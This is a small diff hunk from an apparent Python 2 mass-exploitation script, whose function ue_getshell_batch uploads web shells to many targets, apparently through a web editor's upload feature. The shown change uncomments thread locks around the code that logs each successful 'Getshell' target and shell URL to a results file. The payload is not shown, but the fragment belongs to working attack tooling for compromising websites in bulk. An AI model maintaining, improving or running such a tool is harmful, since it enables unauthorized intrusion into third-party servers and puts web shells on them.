@@ -93,9 +93,9 @@ def ue_getshell_batch(timeout,f4success,f4fail):
 					if rst.json()["list"][0]['state'] == 'SUCCESS':
 						shellAddr = rst.json()["list"][0]['url']
 						print 'Getshell! Shell: ' + shellAddr + '(' + fullUrl + ')'
-						#lock.acquire()
+						lock.acquire()
 						f4success.write(fullUrl+': shell: ' + shellAddr + '\n')
-						#lock.release()
+						lock.release()
 						global succ
 						succ = succ + 1
 					else:
